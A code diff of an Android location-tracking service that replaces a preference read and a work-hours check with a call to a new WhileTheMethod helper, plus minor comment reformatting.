@@ -37,7 +37,7 @@ import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.WhileTheMethod;
 
 /**
  * LocationTracker class is designed to monitoring location
@@ -96,7 +96,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		int timeUp = Integer.parseInt(sp.getString("geo", "5"));
+		int timeUp = WhileTheMethod.getState(3, this);
 		geoMode = sp.getString("geo_mode", "1");
 		locationManager = (LocationManager) mContext
 				.getSystemService(LOCATION_SERVICE);
@@ -104,7 +104,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		// ---------------------------------------------------
 		Logging.doLog(TAG, "onStartCommand gpsTracker",
 				"onStartCommand gpsTracker");
-		if (sp.getString("geo", "5").equals("0")) {
+		if (timeUp == 0) {
 			Logging.doLog(TAG, "Location Stop", "Location Stop");
 			stopLocationManager();
 			stopPlayService();
@@ -132,17 +132,9 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 		// ----------is work ---------------------------------------------------
-
-		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
-		if (!isWork) {
-			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
+		if (timeUp == 0)
 			return 0;
-		} else {
-			Logging.doLog(TAG, Boolean.toString(isWork),
-					Boolean.toString(isWork));
 
-		}
 		locationValue = new LocationValue();
 
 		if (!servicesAvailable()) {
@@ -195,7 +187,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 				Logging.doLog(TAG, "!isGPS&&isNetwork ", "!isGPS&&isNetwork ");
 				return null;
 			} else {
-//				this.canGetLocation = true;
+				// this.canGetLocation = true;
 				// if Network Enabled get lat/long using GPS Services
 				if (isOnline() == true) {
 					Logging.doLog(TAG, "Network isOnline ", "Network isOnline ");
